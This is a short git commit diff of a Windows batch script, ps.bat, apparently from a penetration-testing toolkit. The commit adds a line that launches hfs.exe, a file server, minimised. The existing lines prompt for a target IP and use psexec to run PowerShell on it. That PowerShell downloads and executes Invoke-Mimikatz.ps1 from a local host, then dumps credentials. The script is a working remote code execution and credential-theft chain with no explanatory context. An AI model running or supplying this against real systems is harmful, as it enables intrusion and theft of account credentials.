9641a14d20d902f42f9507f77979103dcc096313
digipenguin <digipenguin@gmail.com>
2015-09-03 10:43:21 +0800

    Update ps.bat

--- ps.bat
+++ ps.bat
@@ -1,5 +1,7 @@
 @echo off
 
+start /min C:\Users\Administrator\Desktop\hfs.exe REM start hfs.exe and minimus windows
+
 set /p var=Target IP addr:
 echo %var%
 psexec \\%var% cmd.exe /c powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.xxx/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
